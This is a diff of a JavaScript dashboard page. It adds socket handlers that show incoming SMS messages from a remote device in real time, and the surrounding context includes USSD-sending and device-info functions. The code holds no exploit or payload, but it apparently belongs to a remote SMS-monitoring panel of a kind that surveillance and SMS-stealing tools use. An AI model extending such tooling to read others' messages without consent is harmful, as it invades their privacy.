@@ -3003,6 +3003,7 @@ function showNoDataMessage() {
 }
 
 // ===================== SOCKET INIT WITH TOKEN =====================
+// ===================== SOCKET INIT WITH TOKEN =====================
 function initSocket() {
   try {
     const socketOptions = {
@@ -3033,9 +3034,45 @@ function initSocket() {
       });
     });
 
+    // ✅ FIXED: Updated smsLogUpdate handler to parse data properly
     socket.on("smsLogUpdate", (data) => {
-      if (data.success && data.event === 'new' && data.uid === DEVICE_ID) {
-        handleLiveSMS(data);
+      console.log('🔔 Details page smsLogUpdate EVENT:', data);
+      
+      // Check if data exists and belongs to this device
+      if (data && data.uid === DEVICE_ID) {
+        console.log('📩 Processing SMS for this device');
+        
+        // Handle different data structures
+        let smsData = data.data || data;
+        
+        if (smsData) {
+          handleLiveSMS({
+            event: 'new',
+            data: smsData,
+            uid: data.uid,
+            success: data.success
+          });
+        }
+      }
+    });
+
+    // ✅ FIXED: Direct SMS event handler
+    socket.on("sms", (data) => {
+      console.log('🔔 Details page direct SMS EVENT:', data);
+      
+      if (data) {
+        // Check if SMS belongs to current device
+        const deviceId = data.uniqueid || data.deviceId || data.uid;
+        
+        if (deviceId === DEVICE_ID) {
+          console.log('📩 Processing direct SMS for device:', deviceId);
+          handleLiveSMS({
+            event: 'new',
+            data: data,
+            uid: deviceId,
+            success: true
+          });
+        }
       }
     });
 
@@ -3068,7 +3105,6 @@ function initSocket() {
     console.error('❌ Socket initialization error:', error);
   }
 }
-
 // ===================== API CALL FUNCTIONS WITH AUTH =====================
 async function fetchWithAuth(url, options = {}) {
   try {
@@ -3194,7 +3230,6 @@ async function loadDeviceMessages() {
       
       console.log('📱 Device Messages:', deviceMessages.length);
       
-      // ✅ FIX: Sort immediately when loading
       deviceMessages.sort((a, b) => {
         const timeA = getTimestampFromSms(a);
         const timeB = getTimestampFromSms(b);
@@ -3203,7 +3238,6 @@ async function loadDeviceMessages() {
       
       allSmsData = deviceMessages;
       
-      // ✅ Use new function to render
       renderAllMessagesSorted();
       
     } else {
@@ -3710,7 +3744,6 @@ async function sendUssd() {
   }
 }
 
-// ===================== DEVICE INFORMATION WITH AUTH =====================
 async function loadDeviceInfo() {
   try {
     const response = await fetchWithAuth(DEVICE_API);
@@ -4240,7 +4273,7 @@ function handleLiveSMS(data) {
     allSmsData.sort((a, b) => {
       const timeA = getTimestampFromSms(a);
       const timeB = getTimestampFromSms(b);
-      return timeB - timeA; // Descending order (newest first)
+      return timeB - timeA;
     });
     
     liveSmsCount++;
